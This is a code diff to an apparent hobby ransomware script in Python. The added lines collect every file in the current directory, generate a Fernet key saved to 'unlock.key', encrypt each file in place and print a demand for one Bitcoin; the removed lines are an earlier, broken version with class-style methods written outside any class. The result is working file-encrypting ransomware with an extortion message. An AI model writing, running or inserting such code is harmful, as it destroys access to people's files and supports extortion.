@@ -15,24 +15,7 @@
 
 
 import os
-import base64
-import sys
 from cryptography.fernet import Fernet
-
-def __init__(self, name):
-    self._name = name
-
-@property
-def name(self):
-    return self._name
-
-@name.setter
-def name(self, new_name):
-    self._name = new_name
-
-@property
-def key(self):
-    key = Fernet.generate_key()
 
 files = []
 
@@ -42,25 +25,16 @@ for file in os.listdir():
     if os.path.isfile(file):
         files.append(file)
 
-def unlock(self):
-    with open("unlock.key", "wb") as unlock:
-        unlock.write(key)
+key = Fernet.generate_key()
 
-def ransom_user(self):
-    print("All of your files have been encrypted!! Send 1 Bitcoin or your files will be NUKED!!")
+with open("unlock.key", "wb") as unlock:
+    unlock.write(key)
 
-def encrypt_file(self, file):
+for file in files:
     with open(file, "rb") as files:
         contents = files.read()
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as files:
         files.write(contents_encrypted)
 
-def get_files_in_folder(self, path):
-
-    for file in os.listdir(path):
-        if file == "README.md" or file == "decryptor.py" or file == "ransomware.py" or file == sys.argv[0]:
-            continue
-        file_path = os.path .join(path, file)
-        if os.path.isfile(file_path):
-            files.append(file_path)
+print("All of your files have been encrypted!! Send 1 Bitcoin or your files will be NUKED!!")
